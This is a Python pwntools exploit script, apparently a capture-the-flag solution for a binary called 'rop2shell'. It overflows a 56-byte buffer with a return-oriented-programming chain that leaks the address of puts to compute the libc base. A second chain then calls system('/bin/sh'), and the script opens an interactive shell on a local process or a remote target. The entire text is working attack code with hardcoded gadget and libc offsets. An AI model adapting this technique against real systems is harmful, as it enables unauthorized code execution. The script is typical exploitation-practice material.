#!/usr/bin/python3

from pwn import *

exe = ELF('rop2shell', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
    input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()
# leak add
pop_rdi = 0x000000000040113a
puts_got = 0x404000
puts_plt = 0x401030
main = 0x000000000040113f
pa = b'a'*56 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
sla(b'there\n\n', pa)
leak = u64(p.recvline(keepends=False) + b'\0\0')
print(f"{hex(leak) = }")
# calc libc_base system and /bin/sh
libc_base = leak - 0x77640
system = libc_base + 0x4dab0
binsh = libc_base + 0x197e34
print(f"{hex(libc_base) = }")
print(f"{hex(system) = }")
print(f"{hex(binsh) = }")
# get shell
pa = b'a'*56 + p64(pop_rdi+1)+p64(pop_rdi) + p64(binsh) + p64(system)
sla(b'there\n\n', pa)

p.interactive()
